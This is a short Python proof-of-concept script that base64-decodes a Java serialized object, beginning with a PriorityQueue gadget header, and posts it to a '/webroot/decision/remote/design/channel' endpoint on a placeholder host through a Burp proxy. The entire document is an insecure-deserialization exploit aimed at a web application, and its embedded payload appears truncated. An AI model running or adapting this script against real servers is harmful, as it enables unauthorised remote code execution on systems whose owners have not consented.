import base64

import requests

burp0_url = "http://ip/webroot/decision/remote/design/channel"

burp0_headers = {"Content-Type": "application/x-www-form-urlencoded"}

proxies={
    "https":"https://127.0.0.1:8080",
    "http":"http://127.0.0.1:8080"
}

b = b"rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwA=="

burp0_data = base64.b64decode(b)
print(burp0_data)

res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False, proxies=proxies)
# res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)

print(res.text)